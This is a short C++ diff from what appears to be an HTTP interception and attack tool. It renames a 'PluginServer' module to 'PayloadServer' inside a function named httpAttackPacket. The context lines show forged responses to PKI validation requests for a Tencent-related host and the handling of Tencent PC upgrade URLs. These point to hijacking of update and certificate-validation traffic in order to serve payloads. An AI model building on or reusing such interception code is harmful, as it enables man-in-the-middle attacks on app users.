@@ -2,7 +2,7 @@
 #include "../Utils/Tools.h"
 #include "Toutiao.h"
 #include "WeixinAndroid.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../HttpUtils.h"
 #include "WeixinPC.h"
 #include "../Public.h"
@@ -89,7 +89,7 @@ int HttpAttack::httpAttackPacket(char* buf, int size, const char* url, const cha
 		if (strstr(url, ".well-known/pki-validation/fileauth.txt"))
 		{
 			lstrcpyA((char*)recvBuffer, "/fileauth.txt HTTP/1.1\r\nHost: helloqq.com\r\n\r\n");
-			ret = PluginServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
+			ret = PayloadServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
 		}
 		else if (QQVideoSSL::isTencentPcUpgrade(url, lphttp->host))
 		{
@@ -108,7 +108,7 @@ int HttpAttack::httpAttackPacket(char* buf, int size, const char* url, const cha
 			}
 		}
 		else {
-			ret = PluginServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
+			ret = PayloadServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
 		}
 		return TRUE;
 	}
